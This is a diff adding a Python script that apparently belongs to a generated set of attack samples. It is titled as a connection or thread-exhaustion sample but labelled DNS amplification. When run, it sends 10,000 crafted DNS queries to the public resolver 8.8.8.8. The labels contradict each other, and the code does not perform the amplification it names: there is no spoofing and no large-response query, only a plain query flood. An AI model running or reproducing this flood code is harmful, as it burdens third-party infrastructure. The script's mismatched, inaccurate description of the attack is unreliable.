@@ -1,0 +1,37 @@
+# Resource Exhaustion - Concurrent Attack Sample 11
+# Created: 2026-03-30T22:24:11.730620
+# Type: Connection Flood / Thread Exhaustion / WebSocket Flood
+
+# DNS Amplification - Sample 5
+import socket
+import struct
+
+def dns_amplification():
+    dns_server = "8.8.8.8"
+    target_domain = "example.com"
+    
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    for i in range(10000):
+        query = build_dns_query(target_domain)
+        sock.sendto(query, (dns_server, 53))
+    
+    sock.close()
+
+def build_dns_query(domain):
+    transaction_id = struct.pack("!H", 0x1234)
+    flags = struct.pack("!H", 0x0100)
+    questions = struct.pack("!H", 1)
+    answer_rrs = struct.pack("!H", 0)
+    authority_rrs = struct.pack("!H", 0)
+    additional_rrs = struct.pack("!H", 0)
+    
+    query = transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs
+    for part in domain.split("."):
+        query += struct.pack("B", len(part)) + part.encode()
+    query += b"\x00"
+    query += struct.pack("!H", 1) + struct.pack("!H", 1)
+    
+    return query
+
+dns_amplification()
